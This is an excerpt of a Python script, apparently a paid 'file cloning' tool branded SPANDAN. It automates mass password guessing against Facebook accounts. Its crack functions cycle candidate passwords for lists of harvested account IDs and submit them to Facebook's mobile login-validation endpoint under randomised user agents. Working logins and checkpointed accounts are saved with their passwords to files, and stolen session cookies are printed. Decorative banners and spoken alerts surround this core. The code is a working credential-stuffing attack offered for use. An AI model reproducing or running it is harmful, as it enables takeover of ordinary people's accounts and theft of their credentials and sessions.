...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/SPANDAN.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[1;32m╚══════╝\033[1;32m╚═╝  ╚═╝ \033[1;32m╚═════╝ ╚═╝  ╚═══╝
                                                                                                                                                                                                                                          \033[1;37m--------------------------------------------------
\033[1;32m[\033[1;32m✓] \033[1;36mAUTHOR      :\033[1;32m SPANDAN BHUJEL
\033[1;32m[\033[1;32m✓] \033[1;36mTYPE        :\033[1;33m PAID
\033[1;32m[\033[1;32m✓] \033[1;36mREGION      :\033[1;34m NEPAL
\033[1;32m[\033[1;32m✓] \033[1;36mTOOLS TYPE  :\033[1;31m FILE CLONING
\033[1;37m----------------------------------------------""")
...
os.system('espeak -a 300 " Welcome,   to,  SPANDAN,  BRAND,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    SPANDAN = input('\x1b[1;92m[+] CHOOSE: ')
    if SPANDAN in ['111']:
        login()
        dump_massal()
    elif SPANDAN in ['1']:
        crack_file()
    elif SPANDAN in ['2','02']:
        os.system('xdg-open https://www.facebook.com/SPANDAN.khadka.587')
        os.system("python nono.py")
    elif SPANDAN in ['3','03']:
        result()
    elif SPANDAN in ['0']:
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[97;1mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[97;1mTODAY'S DATE :\033[1;92m "+date)
    print('\033[97;1mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
    print("\033[97;1mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[97;1mCLONING SPEED SUPER FAST")
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[SPANDANM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[SPANDAN-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[SPANDAN-Ok] {idf} • {pw}\n\033[0;93m[🍪]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " SPANDAN,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[SPANDAN-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•SPANDAN-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•SPANDAN-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  SPANDAN,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
